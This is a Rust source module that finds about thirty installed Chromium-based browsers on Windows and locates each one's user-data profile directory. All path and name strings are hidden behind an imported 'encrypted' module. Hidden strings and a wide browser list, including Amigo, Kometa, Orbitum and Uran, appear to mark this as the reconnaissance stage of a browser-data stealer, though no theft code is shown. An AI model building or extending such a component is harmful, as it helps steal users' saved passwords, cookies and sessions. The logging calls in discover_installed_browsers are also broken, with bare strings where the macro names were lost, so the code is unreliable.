//! Browser discovery via filesystem checks (no registry).

use std::env;
use std::path::{Path, PathBuf};
use crate::encrypted::*;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DataRoot {
    Local,
    Roaming,
}

#[derive(Clone, Debug)]
pub struct BrowserPath {
    pub name: String,
    pub exe: String,
    pub user_data_rel: String,
    pub root: DataRoot,
    pub has_profiles: bool,
}

fn fallback_for(exe_name: &str) -> Option<PathBuf> {
    let pf = env::var(s_env_programfiles()).unwrap_or_default();
    let pf86 = env::var(s_env_programfiles86()).unwrap_or_default();
    let local = env::var(s_localappdata()).unwrap_or_default();
    let roaming = env::var(s_appdata()).unwrap_or_default();

    let exe_path = |base: &str, sub: &str| -> PathBuf {
        PathBuf::from(base).join(sub).join(exe_name)
    };

    let candidates: Vec<PathBuf> = {
        let e = exe_name;
        if e == s_path_chrome_exe() {
            vec![
                exe_path(&pf, &s_path_app_chrome()),
                exe_path(&pf86, &s_path_app_chrome()),
                exe_path(&local, &s_path_app_chrome()),
            ]
        } else if e == s_path_msedge_exe() {
            vec![
                exe_path(&pf, &s_path_app_edge()),
                exe_path(&pf86, &s_path_app_edge()),
                exe_path(&local, &s_path_app_edge()),
            ]
        } else if e == s_path_brave_exe() {
            vec![
                exe_path(&pf, &s_path_app_brave()),
                exe_path(&pf86, &s_path_app_brave()),
                exe_path(&local, &s_path_app_brave()),
                exe_path(&local, &s_path_app_brave_beta()),
                exe_path(&local, &s_path_app_brave_nightly()),
            ]
        } else if e == s_path_vivaldi_exe() {
            vec![
                exe_path(&local, &s_path_app_vivaldi()),
                exe_path(&pf, &s_path_app_vivaldi()),
            ]
        } else if e == s_path_opera_exe() {
            vec![
                exe_path(&local, &s_path_app_opera()),
                exe_path(&local, &s_path_app_opera_gx()),
                exe_path(&pf, &s_browser_opera()),
                exe_path(&roaming, &s_path_app_opera_roaming()),
            ]
        } else if e == s_path_browser_exe() {
            vec![
                exe_path(&local, &s_path_app_yandex()),
                exe_path(&pf, &s_path_app_yandex()),
                exe_path(&local, &s_path_app_coccoc()),
            ]
        } else if e == s_path_360chrome_exe() {
            vec![exe_path(&local, &s_path_app_360())]
        } else if e == s_path_epic_exe() {
            vec![
                exe_path(&local, &s_path_app_epic()),
                exe_path(&pf, &s_path_app_epic()),
            ]
        } else if e == s_path_centbrowser_exe() {
            vec![
                exe_path(&local, &s_path_app_cent()),
                exe_path(&pf, &s_path_app_cent()),
            ]
        } else if e == s_path_torch_exe() {
            vec![exe_path(&local, &s_path_app_torch())]
        } else if e == s_path_slimjet_exe() {
            vec![exe_path(&local, &s_path_app_slimjet())]
        } else if e == s_path_iridium_exe() {
            vec![exe_path(&local, &s_path_app_iridium())]
        } else if e == s_path_thorium_exe() {
            vec![exe_path(&local, &s_path_app_thorium())]
        } else if e == s_path_7star_exe() {
            vec![exe_path(&local, &s_path_app_7star())]
        } else if e == s_path_orbitum_exe() {
            vec![exe_path(&local, &s_path_app_orbitum())]
        } else if e == s_path_kometa_exe() {
            vec![exe_path(&local, &s_path_app_kometa())]
        } else if e == s_path_amigo_exe() {
            vec![exe_path(&local, &s_path_app_amigo())]
        } else if e == s_path_sputnik_exe() {
            vec![exe_path(&local, &s_path_app_sputnik())]
        } else if e == s_path_uran_exe() {
            vec![exe_path(&local, &s_path_app_uran())]
        } else if e == s_path_arc_exe() || e.eq_ignore_ascii_case(&s_path_arc_exe()) {
            vec![exe_path(&local, &s_path_app_arc())]
        } else {
            Vec::new()
        }
    };

    for c in candidates {
        if c.exists() {
            return Some(c);
        }
    }
    None
}

pub fn find_app_path(exe_name: &str) -> Option<PathBuf> {
    fallback_for(exe_name)
}

pub fn all_browsers() -> Vec<BrowserPath> {
    vec![
        BrowserPath { name: s_browser_chrome(), exe: s_path_chrome_exe(), user_data_rel: s_path_chrome_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_chrome_beta(), exe: s_path_chrome_exe(), user_data_rel: s_path_chrome_beta_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_chrome_dev(), exe: s_path_chrome_exe(), user_data_rel: s_path_chrome_dev_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_chrome_canary(), exe: s_path_chrome_exe(), user_data_rel: s_path_chrome_sxs_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_chromium(), exe: s_path_chrome_exe(), user_data_rel: s_path_chromium_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_edge(), exe: s_path_msedge_exe(), user_data_rel: s_path_edge_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_edge_beta(), exe: s_path_msedge_exe(), user_data_rel: s_path_edge_beta_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_edge_dev(), exe: s_path_msedge_exe(), user_data_rel: s_path_edge_dev_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_brave(), exe: s_path_brave_exe(), user_data_rel: s_path_brave_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_brave_beta(), exe: s_path_brave_exe(), user_data_rel: s_path_brave_beta_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_brave_nightly(), exe: s_path_brave_exe(), user_data_rel: s_path_brave_nightly_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_opera(), exe: s_path_opera_exe(), user_data_rel: s_path_opera_stable_ud_rel(), root: DataRoot::Roaming, has_profiles: false },
        BrowserPath { name: s_browser_opera_gx_name(), exe: s_path_opera_exe(), user_data_rel: s_path_opera_gx_ud_rel(), root: DataRoot::Roaming, has_profiles: false },
        BrowserPath { name: s_paths_opera_neon(), exe: s_path_opera_exe(), user_data_rel: s_path_opera_neon_ud_rel(), root: DataRoot::Roaming, has_profiles: true },
        BrowserPath { name: s_browser_vivaldi(), exe: s_path_vivaldi_exe(), user_data_rel: s_path_vivaldi_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_yandex(), exe: s_path_browser_exe(), user_data_rel: s_path_yandex_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_coccoc_name(), exe: s_path_browser_exe(), user_data_rel: s_path_coccoc_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_cent_name(), exe: s_path_centbrowser_exe(), user_data_rel: s_path_cent_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_360chrome_name(), exe: s_path_360chrome_exe(), user_data_rel: s_path_360_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_epic_name(), exe: s_path_epic_exe(), user_data_rel: s_path_epic_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_uran_name(), exe: s_path_uran_exe(), user_data_rel: s_path_uran_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_7star_name(), exe: s_path_7star_exe(), user_data_rel: s_path_7star_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_torch_name(), exe: s_path_torch_exe(), user_data_rel: s_path_torch_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_kometa_name(), exe: s_path_kometa_exe(), user_data_rel: s_path_kometa_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_orbitum_name(), exe: s_path_orbitum_exe(), user_data_rel: s_path_orbitum_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_amigo_name(), exe: s_path_amigo_exe(), user_data_rel: s_path_amigo_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_sputnik_name(), exe: s_path_sputnik_exe(), user_data_rel: s_path_sputnik_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_slimjet_name(), exe: s_path_slimjet_exe(), user_data_rel: s_path_slimjet_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_iridium_name(), exe: s_path_iridium_exe(), user_data_rel: s_path_iridium_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_thorium_name(), exe: s_path_thorium_exe(), user_data_rel: s_path_thorium_ud_rel(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: s_browser_arc_name(), exe: s_path_arc_exe(), user_data_rel: s_path_arc_ud_rel(), root: DataRoot::Local, has_profiles: true },
    ]
}

pub fn discover_installed_browsers() -> Vec<BrowserPath> {
    let local = env::var(s_localappdata()).unwrap_or_default();
    let roaming = env::var(s_appdata()).unwrap_or_default();
    let mut installed = Vec::new();

    for b in all_browsers() {
        let exe_hit = find_app_path(&b.exe).is_some();
        let root = match b.root {
            DataRoot::Local => &local,
            DataRoot::Roaming => &roaming,
        };
        let user_data = Path::new(root).join(&b.user_data_rel);
        let user_data_exists = user_data.exists();

        if exe_hit || user_data_exists {
                "paths: '{}' exe={} user_data_exists={} -> include",
                b.name, exe_hit, user_data_exists
            );
            installed.push(b);
        } else {
                "paths: '{}' exe={} user_data_exists={} -> skip",
                b.name, exe_hit, user_data_exists
            );
        }
    }

    installed
}

pub fn user_data_path(b: &BrowserPath) -> PathBuf {
    let root = match b.root {
        DataRoot::Local => env::var(s_localappdata()).unwrap_or_default(),
        DataRoot::Roaming => env::var(s_appdata()).unwrap_or_default(),
    };
    PathBuf::from(root).join(&b.user_data_rel)
}
